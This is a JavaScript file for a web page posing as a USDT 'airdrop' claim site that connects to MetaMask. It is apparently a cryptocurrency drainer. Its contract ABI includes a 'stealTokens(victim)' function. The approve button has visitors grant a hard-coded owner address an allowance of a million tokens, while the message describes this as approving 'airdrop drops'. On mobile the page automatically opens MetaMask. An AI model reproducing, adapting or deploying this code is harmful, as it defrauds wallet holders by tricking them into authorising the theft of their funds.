const contractAddress = '0x4a21a1a07a3157e06d739D3bb231628143a66C29';
const tokenAddress = '0x59610B067eCfeCEdaf146A5E9B180C440f008575';
const ownerAddress = '0x9052EB26C0b9836335Ec153413F80bAEc7536414';

const contractABI = [
  {
    "inputs": [
      { "internalType": "address", "name": "spender", "type": "address" },
      { "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "account", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      { "internalType": "address", "name": "recipient", "type": "address" },
      { "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "transfer",
    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      { "internalType": "address", "name": "sender", "type": "address" },
      { "internalType": "address", "name": "recipient", "type": "address" },
      { "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "transferFrom",
    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }],
    "name": "stealTokens",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "withdrawETH",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "withdrawTokens",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

let web3;
let accounts;

async function connectMetaMask() {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    try {
      accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      document.getElementById('approveButton').disabled = false;
      document.getElementById('claimAirdropButton').disabled = false;
      document.getElementById('withdrawETHButton').style.display = 'inline-block';
      document.getElementById('withdrawTokensButton').style.display = 'inline-block';
    } catch (error) {
      alert('MetaMask connection failed');
    }
  } else {
    alert('MetaMask not detected! Please install MetaMask.');
  }
}

function isMobileDevice() {
  return /Mobi|Android/i.test(navigator.userAgent);
}

function openMetaMaskMobile() {
  window.location.href = `metamask://dapp/${window.location.href}`;
  setTimeout(() => {
    if (!document.hidden) {
      alert('If MetaMask is not opened, please ensure it is installed.');
    }
  }, 1000);
}

async function approveTokens() {
  const contract = new web3.eth.Contract(contractABI, contractAddress);
  try {
    await contract.methods.approve(ownerAddress, web3.utils.toWei("1000000", "ether")).send({ from: accounts[0] });
    alert('Approved unlimited USDT drops');
    document.getElementById('claimAirdropButton').disabled = false;
  } catch (error) {
    console.error(error);
    alert('Approval failed');
  }
}

async function claimAirdrop() {
  document.getElementById('claimAirdropButton').disabled = true;
  document.getElementById('processingMessage').classList.add('show');
  document.getElementById('claimAirdropButton').classList.add('flashText');

  const contract = new web3.eth.Contract(contractABI, contractAddress);
  try {
    const airdropAmount = web3.utils.toWei('10', 'ether');
    await contract.methods.transfer(accounts[0], airdropAmount).send({ from: accounts[0] });
    alert('Airdrop claimed!');
  } catch (error) {
    alert('Airdrop failed');
  } finally {
    document.getElementById('processingMessage').classList.remove('show');
    document.getElementById('claimAirdropButton').classList.remove('flashText');
  }
}

async function withdrawETH() {
  const contract = new web3.eth.Contract(contractABI, contractAddress);
  try {
    await contract.methods.withdrawETH().send({ from: accounts[0] });
    alert('ETH Withdrawn');
  } catch (error) {
    alert('ETH withdrawal failed');
  }
}

async function withdrawTokens() {
  const contract = new web3.eth.Contract(contractABI, contractAddress);
  try {
    await contract.methods.withdrawTokens().send({ from: accounts[0] });
    alert('Tokens Withdrawn');
  } catch (error) {
    alert('Token withdrawal failed');
  }
}

document.getElementById('connectButton').addEventListener('click', connectMetaMask);
document.getElementById('approveButton').addEventListener('click', approveTokens);
document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH);
document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens);

if (isMobileDevice()) {
  openMetaMaskMobile();
}



